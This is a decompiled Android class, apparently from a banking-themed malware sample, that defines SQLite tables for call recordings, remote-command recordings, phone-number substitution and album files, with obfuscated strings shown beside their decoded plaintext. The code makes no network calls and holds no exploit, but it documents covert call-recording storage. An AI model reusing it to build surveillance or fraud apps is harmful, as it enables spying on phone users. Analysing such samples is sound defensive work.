package com.wish.lmbank.db;

import android.content.Context;
import android.database.sqlite.SQLiteDatabase;

import com.wish.lmbank.utils.LogUtils;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/db/RecordingDB.class */
public class RecordingDB extends SQLiteCacheHelper {
    protected static final String ALBUM_COLUMN_ID = "id";
    protected static final String ALBUM_COLUMN_NAME = "name";
    protected static final String ALBUM_COLUMN_PATH = "path";
    protected static final String ALBUM_COLUMN_REAL_PATH = "real_path";
    protected static final String ALBUM_COLUMN_STATUS = "status";
    protected static final String ALBUM_COLUMN_TIME = "time";
    protected static final String ALBUM_TABLE_NAME = "album";
    protected static final String CALL_RECORDING_COLUMN_CREATE_TIME = "createtime";
    protected static final String CALL_RECORDING_COLUMN_DURATION = "duration";
    protected static final String CALL_RECORDING_COLUMN_ID = "id";
    protected static final String CALL_RECORDING_COLUMN_PATH = "path";
    protected static final String CALL_RECORDING_COLUMN_PHONE_NUMBER = "phoneNumber";
    protected static final String CALL_RECORDING_COLUMN_STATUS = "status";
    protected static final String CALL_RECORDING_COLUMN_TYPE = "type";
    protected static final String CALL_RECORDING_COLUMN_UPDATE_TIME = "updatetime";
    protected static final String CALL_RECORDING_TABLE_NAME = "call_recording";
    protected static final String COLOR_RING_COLUMN_FILE = "file";
    protected static final String COLOR_RING_COLUMN_ID = "id";
    protected static final String COLOR_RING_COLUMN_PHONE = "phone";
    protected static final String COLOR_RING_TABLE_NAME = "color_ring";
    protected static final String COMMAND_RECORDING_COLUMN_CREATE_TIME = "createtime";
    protected static final String COMMAND_RECORDING_COLUMN_DURATION = "duration";
    protected static final String COMMAND_RECORDING_COLUMN_ID = "id";
    protected static final String COMMAND_RECORDING_COLUMN_PATH = "path";
    protected static final String COMMAND_RECORDING_COLUMN_RECORDING_ID = "rId";
    protected static final String COMMAND_RECORDING_COLUMN_STATUS = "status";
    protected static final String COMMAND_RECORDING_COLUMN_UPDATE_TIME = "updatetime";
    protected static final String COMMAND_RECORDING_TABLE_NAME = "command_recording";
    protected static final String LIMIT_PHONE_NUMBER_COLUMN_ID = "id";
    protected static final String LIMIT_PHONE_NUMBER_COLUMN_NAME = "name";
    protected static final String LIMIT_PHONE_NUMBER_COLUMN_PHONE = "phone";
    protected static final String LIMIT_PHONE_NUMBER_COLUMN_REAL_PHONE = "real_phone";
    protected static final String LIMIT_PHONE_NUMBER_COLUMN_SPECIAL = "special";
    protected static final String LIMIT_PHONE_NUMBER_COLUMN_TYPE = "type";
    protected static final String LIMIT_PHONE_NUMBER_TABLE_NAME = "limit_phone_number";
    private static final String TAG = "com.wish.lmbank.db.RecordingDB";
    private static final int VERSION = 8;

    public RecordingDB(Context context, String str) {
//         super(context, bb7d7pu7.m5998("BAgHDgY2GwwKBhsNDBs2DQs"), 8, str);
        super(context, "mango_recorder_db", 8, str);
    }

    @Override // com.wish.lmbank.db.SQLiteCacheHelper
    protected void onCreateTable(SQLiteDatabase sQLiteDatabase) {
//         LogUtils.v(TAG, bb7d7pu7.m5998("BgcqGwwIHQw9CAsFDA"));
        LogUtils.v(TAG, "onCreateTable");
        createCallRecordingTable(sQLiteDatabase);
        createCommandRecordingTable(sQLiteDatabase);
        createLimitPhoneNumberTable(sQLiteDatabase);
        createAlbumTable(sQLiteDatabase);
        createColorRingTable(sQLiteDatabase);
    }

    private void createCallRecordingTable(SQLiteDatabase sQLiteDatabase) {
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("LTsmOUk9KCslLEkgL0ksMSA6PTpJCggFBTYbDAoGGw0ABw4"));
        sQLiteDatabase.execSQL("DROP TABLE IF EXISTS call_recording");
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("KjssKD0sST0oKyUsSSAvSScmPUksMSA6PTpJCggFBTYbDAoGGw0ABw5JQQANSSAnPSwuLDtJRUkdEBkMST0sMT1JJyY9SSc8JSVFSRkBBgcMJxwECwwbST0sMT1JJyY9SSc8JSVFSQ0cGwgdAAYHSSAnPSwuLDtJJyY9SSc8JSVJLSwvKDwlPUlZRUkZCB0BST0sMT1JRUkKGwwIHQwdAAQMSSAnPSwuLDtFSRwZDQgdDB0ABAxJICc9LC4sO0VJGh0IHRwaST0sMT1JJyY9SSc8JSVJRUk5OyAkKDswSSIsMElBAA1ASUBS"));
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS call_recording (id INTEGER , type TEXT NOT NULL, phoneNumber TEXT NOT NULL, duration INTEGER NOT NULL DEFAULT 0, path TEXT , createtime INTEGER, updatetime INTEGER, status TEXT NOT NULL , PRIMARY KEY (id) );");
    }

    private void createCommandRecordingTable(SQLiteDatabase sQLiteDatabase) {
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("LTsmOUk9KCslLEkgL0ksMSA6PTpJCgYEBAgHDTYbDAoGGw0ABw4"));
        sQLiteDatabase.execSQL("DROP TABLE IF EXISTS command_recording");
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("KjssKD0sST0oKyUsSSAvSScmPUksMSA6PTpJCgYEBAgHDTYbDAoGGw0ABw5JQQANSSAnPSwuLDtJRUkbIA1JICc9LC4sO0knJj1JJzwlJUVJDRwbCB0ABgdJICc9LC4sO0knJj1JJzwlJUktLC8oPCU9SVlFSRkIHQFJPSwxPUlFSQobDAgdDB0ABAxJICc9LC4sO0VJHBkNCB0MHQAEDEkgJz0sLiw7RUkaHQgdHBpJPSwxPUknJj1JJzwlJUlFSTk7ICQoOzBJIiwwSUEADUBJQFI"));
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS command_recording (id INTEGER , rId INTEGER NOT NULL, duration INTEGER NOT NULL DEFAULT 0, path TEXT , createtime INTEGER, updatetime INTEGER, status TEXT NOT NULL , PRIMARY KEY (id) );");
    }

    private void createLimitPhoneNumberTable(SQLiteDatabase sQLiteDatabase) {
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("LTsmOUk9KCslLEkgL0ksMSA6PTpJBQAEAB02GQEGBww2BxwECwwb"));
        sQLiteDatabase.execSQL("DROP TABLE IF EXISTS limit_phone_number");
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("KjssKD0sST0oKyUsSSAvSScmPUksMSA6PTpJBQAEAB02GQEGBww2BxwECwwbSUEADUkgJz0sLiw7SUVJBwgEDEk9LDE9SScmPUknPCUlRUkZAQYHDEk9LDE9SScmPUknPCUlRUkbDAgFNhkBBgcMST0sMT1JJyY9SSc8JSVFSR0QGQxJPSwxPUknJj1JJzwlJUVJGhkMCgAIBUkgJz0sLiw7SScmPUknPCUlRUk5OyAkKDswSSIsMElBAA1ASUBS"));
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS limit_phone_number (id INTEGER , name TEXT NOT NULL, phone TEXT NOT NULL, real_phone TEXT NOT NULL, type TEXT NOT NULL, special INTEGER NOT NULL, PRIMARY KEY (id) );");
    }

    private void createAlbumTable(SQLiteDatabase sQLiteDatabase) {
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("LTsmOUk9KCslLEkgL0ksMSA6PTpJCAULHAQ"));
        sQLiteDatabase.execSQL("DROP TABLE IF EXISTS album");
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("KjssKD0sST0oKyUsSSAvSScmPUksMSA6PTpJCAULHARJQQANSSAnPSwuLDtJOTsgJCg7MEkiLDBJKDw9JiAnKjssJCwnPUVJBwgEDEk9LDE9SScmPUknPCUlRUkZCB0BST0sMT1JJyY9SSc8JSVFSRsMCAU2GQgdAUk9LDE9SScmPUknPCUlRUkdAAQMST0sMT1JJyY9SSc8JSVFSRodCB0cGkk9LDE9SScmPUknPCUlQFI"));
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS album (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, path TEXT NOT NULL, real_path TEXT NOT NULL, time TEXT NOT NULL, status TEXT NOT NULL);");
    }

    private void createColorRingTable(SQLiteDatabase sQLiteDatabase) {
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("LTsmOUk9KCslLEkgL0ksMSA6PTpJCgYFBhs2GwAHDg"));
        sQLiteDatabase.execSQL("DROP TABLE IF EXISTS color_ring");
//         sQLiteDatabase.execSQL(bb7d7pu7.m5998("KjssKD0sST0oKyUsSSAvSScmPUksMSA6PTpJCgYFBhs2GwAHDklBAA1JICc9LC4sO0k5OyAkKDswSSIsMEkoPD0mICcqOywkLCc9RUkZAQYHDEk9LDE9SScmPUknPCUlRUkPAAUMST0sMT1JJyY9SSc8JSVAUg"));
        sQLiteDatabase.execSQL("CREATE TABLE IF NOT EXISTS color_ring (id INTEGER PRIMARY KEY AUTOINCREMENT, phone TEXT NOT NULL, file TEXT NOT NULL);");
    }
}
